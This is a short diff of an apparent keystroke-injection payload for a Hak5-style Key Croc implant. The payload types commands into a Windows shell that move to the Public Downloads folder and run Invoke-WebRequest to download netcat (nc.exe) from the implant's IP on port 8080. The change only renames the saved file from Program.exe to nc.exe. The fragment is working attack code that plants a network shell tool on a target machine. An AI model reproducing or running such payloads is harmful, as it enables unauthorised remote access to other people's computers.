@@ -39,7 +39,7 @@ Q STRING "cd C:\Users\Public\Downloads"
 DELAY 500
 Q ENTER
 
-Q STRING "Invoke-WebRequest 'http://${croc_ip}:8080/nc.exe' -O Program.exe"
+Q STRING "Invoke-WebRequest 'http://${croc_ip}:8080/nc.exe' -O nc.exe"
 DELAY 1000
 Q ENTER
 
